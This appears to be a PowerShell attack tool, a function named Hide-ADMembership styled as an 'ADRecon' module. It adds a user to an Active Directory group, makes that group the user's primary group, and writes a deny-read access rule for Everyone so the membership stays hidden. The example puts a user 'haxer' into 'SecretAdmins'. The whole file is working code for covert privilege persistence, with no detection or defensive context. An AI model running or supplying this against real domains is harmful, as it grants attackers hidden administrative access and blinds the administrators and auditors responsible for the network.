function Hide-ADMembership {
    <#
    .SYNOPSIS
        Adds a user to a group, sets it as the primary group, and conceals membership by modifying access control rules.
    .PARAMETER GroupName
        The name of the group to add the user to and hide membership for.
    .PARAMETER UserLogonName
        The logon name (sAMAccountName) of the user whose group membership is to be hidden.
    .EXAMPLE
        Hide-ADMembership -GroupName "SecretAdmins" -UserLogonName "haxer"
    #>
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$GroupName,
        
        [Parameter(Mandatory = $true)]
        [ValidateNotNullOrEmpty()]
        [string]$UserLogonName
    )

    begin {
        # Initialize constants
        $PrimaryGroupIdGuid = New-Object Guid "bf967a00-0de6-11d0-a285-00aa003049e2"
        $EveryoneSid = (New-Object System.Security.Principal.NTAccount("Everyone")).Translate([System.Security.Principal.SecurityIdentifier])
        $currentUserSid = ([System.Security.Principal.WindowsIdentity]::GetCurrent()).User
        $execTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

        # Print ADRecon-style header
        Write-Host "`n==================================================================" -ForegroundColor Cyan
        Write-Host " ADRecon: Hide-ADMembership Execution Report" -ForegroundColor Cyan
        Write-Host "==================================================================" -ForegroundColor Cyan
        Write-Host "Execution Time: $execTime" -ForegroundColor White
        Write-Host "Module: Hide-ADMembership" -ForegroundColor White
        Write-Host "------------------------------------------------------------------`n" -ForegroundColor Cyan

        # Import Active Directory module
        try {
            Import-Module ActiveDirectory -ErrorAction Stop
            Write-Host "[+] Active Directory module loaded." -ForegroundColor Green
        }
        catch {
            Write-Host "[-] Error: Failed to load Active Directory module: $($_.Exception.Message)" -ForegroundColor Red
            return
        }
    }

    process {
        try {
            # Resolve group and extract RID
            $group = Get-ADGroup -Identity $GroupName -Properties Sid -ErrorAction Stop
            $groupRid = ($group.Sid.Value -split '-')[-1]
            if (-not $groupRid -or $groupRid -notmatch '^\d+$') {
                throw "Invalid RID for group '$GroupName'."
            }
            $groupDn = $group.DistinguishedName

            # Resolve user
            $user = Get-ADUser -Identity $UserLogonName -Properties DistinguishedName, primaryGroupID, MemberOf -ErrorAction Stop
            $userDn = $user.DistinguishedName
            if (-not $userDn) {
                throw "Unable to resolve DN for user '$UserLogonName'."
            }

            # Display initial parameters
            $paramsTable = @(
                [PSCustomObject]@{ Parameter = "Group Name"; Value = $GroupName }
                [PSCustomObject]@{ Parameter = "User Logon Name"; Value = $UserLogonName }
                [PSCustomObject]@{ Parameter = "Group SID"; Value = $group.Sid.Value }
                [PSCustomObject]@{ Parameter = "Group RID"; Value = $groupRid }
                [PSCustomObject]@{ Parameter = "User DN"; Value = $userDn }
            )
            Write-Host "`nParameters" -ForegroundColor Cyan
            $paramsTable | Format-Table -AutoSize | Out-String | Write-Host -ForegroundColor White

            # Check and handle group membership
            if ($user.primaryGroupID -eq $groupRid) {
                Write-Host "[!] Group '$GroupName' is already the primary group for '$UserLogonName'." -ForegroundColor Yellow
            }
            else {
                try {
                    Add-ADGroupMember -Identity $GroupName -Members $UserLogonName -ErrorAction Stop
                    Write-Host "[+] Added '$UserLogonName' to group '$GroupName'." -ForegroundColor Green
                }
                catch {
                    Write-Host "[!] Warning: Unable to add '$UserLogonName' to '$GroupName': $($_.Exception.Message)" -ForegroundColor Yellow
                }

                # Verify membership
                $user = Get-ADUser -Identity $UserLogonName -Properties MemberOf -ErrorAction Stop
                if ($user.MemberOf -notcontains $groupDn) {
                    throw "Membership verification failed for '$UserLogonName' in '$GroupName'."
                }

                # Set primary group
                $adObject = [ADSI]"LDAP://$userDn"
                if (-not $adObject.Path) {
                    throw "Unable to connect to AD object at '$userDn'."
                }
                $adObject.primaryGroupId = [int]$groupRid
                $adObject.CommitChanges()
                Write-Host "[+] Set '$GroupName' as primary group for '$UserLogonName' (RID: $groupRid)." -ForegroundColor Green

                # Verify primary group
                $user = Get-ADUser -Identity $UserLogonName -Properties primaryGroupID -ErrorAction Stop
                if ($user.primaryGroupID -ne $groupRid) {
                    throw "Primary group ID not set to '$groupRid' for '$UserLogonName'."
                }
            }

            # Configure security descriptor
            $adObject.PsBase.Options.SecurityMasks = "Dacl"
            $securityDescriptor = $adObject.PsBase.ObjectSecurity
            $aceAllow = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($currentUserSid, "WriteProperty", "Allow", $PrimaryGroupIdGuid)
            $securityDescriptor.AddAccessRule($aceAllow)
            $aceDeny = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($EveryoneSid, "ReadProperty", "Deny", $PrimaryGroupIdGuid)
            $securityDescriptor.AddAccessRule($aceDeny)
            $adObject.CommitChanges()
            Write-Host "[+] Configured access rules: WriteProperty allowed for current user, ReadProperty denied for Everyone." -ForegroundColor Green

            # Summary table
            $summaryTable = @(
                [PSCustomObject]@{ Step = "Module Import"; Status = "Success"; Details = "Active Directory module loaded." }
                [PSCustomObject]@{ Step = "Group Resolution"; Status = "Success"; Details = "Resolved '$GroupName' (RID: $groupRid)." }
                [PSCustomObject]@{ Step = "User Resolution"; Status = "Success"; Details = "Resolved '$UserLogonName'." }
                [PSCustomObject]@{ Step = "Group Membership"; Status = "Success"; Details = "'$UserLogonName' added to '$GroupName'." }
                [PSCustomObject]@{ Step = "Primary Group"; Status = "Success"; Details = "Set to '$GroupName' (RID: $groupRid)." }
                [PSCustomObject]@{ Step = "Access Rules"; Status = "Success"; Details = "WriteProperty allowed, ReadProperty denied." }
            )
            Write-Host "`nExecution Summary" -ForegroundColor Cyan
            $summaryTable | Format-Table -AutoSize | Out-String | Write-Host -ForegroundColor White

            Write-Host "[+] Completed: Membership hidden for '$UserLogonName' in '$GroupName'." -ForegroundColor Cyan
            Write-Host "------------------------------------------------------------------`n" -ForegroundColor Cyan
        }
        catch {
            Write-Host "[-] Error: $($_.Exception.Message)" -ForegroundColor Red
            $errorTable = @([PSCustomObject]@{ Error = $_.Exception.Message })
            Write-Host "`nError Summary" -ForegroundColor Red
            $errorTable | Format-Table -AutoSize | Out-String | Write-Host -ForegroundColor White
            return
        }
        finally {
            if ($adObject -and $adObject.PsBase -is [System.__ComObject]) {
                [System.Runtime.InteropServices.Marshal]::ReleaseComObject($adObject) | Out-Null
            }
        }
    }
}

# Example usage
# Hide-ADMembership -GroupName "SecretAdmins" -UserLogonName "haxer"